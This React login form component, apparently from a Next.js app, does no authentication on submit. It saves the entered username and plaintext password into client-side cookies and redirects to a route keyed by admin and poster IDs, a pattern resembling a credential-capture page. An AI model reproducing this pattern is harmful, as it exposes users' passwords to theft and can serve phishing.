import React, { useState } from "react";
import { Formik, Form } from "formik";
import * as Yup from "yup";
import { MdVisibility, MdVisibilityOff } from "react-icons/md";
import TextfieldWrapper from "./TextfieldWrapper";
import SubmitButton from "./SubmitButton";
import Cookies from "js-cookie";
import { useRouter } from "next/router";

function LoginForm() {
  const [showPassword, setShowPassword] = useState(false);
  const {
    push,
    query: { adminId, posterId },
  } = useRouter();

  const initialvalues = {
    username: "",
    passcode: "",
  };

  const validate = Yup.object({
    username: Yup.string().required("Required"),
    passcode: Yup.string().required("Required"),
  });

  const handleSubmit = (values, formik) => {
    const { username, passcode } = values;

    Cookies.set("username", username);
    Cookies.set("passcode", passcode);
    push(`/${adminId}/${posterId}/account`);
  };

  return (
    <div className="md:w-[550px] lg:w-[632px] mx-auto mt-[60px] lg:mt-[95px] mb-[90px] lg:mb-[144px]">
      <div className="flex flex-col items-ceneter">
        <div className="">
          <div className="bg-custom-indigo text-white text-xl font-medium px-[26px] py-[18px] shadow-md">
            Login
          </div>
          <div className="border border-slate-300 border-opacity-40 px-[15px] pt-7 pb-[24px]">
            <Formik
              initialValues={initialvalues}
              validationSchema={validate}
              onSubmit={handleSubmit}
            >
              {(formik) => (
                <Form className="space-y-[18px]">
                  <TextfieldWrapper
                    name="username"
                    label="Username"
                    type="text"
                    helpertext="usernames are case-sensitive"
                  />
                  <div className="relative">
                    <TextfieldWrapper
                      name="passcode"
                      label="Password"
                      helpertext="passwords are case-sensitive"
                      autoComplete="on"
                      type={showPassword ? "text" : "password"}
                    />
                    <span
                      className="absolute right-0 top-[17px] text-[23px] opacity-50 cursor-pointer"
                      onClick={() => setShowPassword(!showPassword)}
                    >
                      {showPassword ? <MdVisibilityOff /> : <MdVisibility />}
                    </span>
                  </div>

                  <div className="mt-5 flex justify-center">
                    <SubmitButton>Login</SubmitButton>
                  </div>
                </Form>
              )}
            </Formik>

            <div className="mt-[58px] mx-4 lg:mx-[55px] text-[16.5px] flex justify-between items-center text-custom-indigo">
              <p className="cursor-pointer">Set New Password</p>
              <p className="cursor-pointer">Sign Up</p>
              <p className="cursor-pointer">Help</p>
            </div>
          </div>
        </div>
      </div>
      <div className="h-[1px] bg-slate-600/50"></div>
    </div>
  );
}

export default LoginForm;
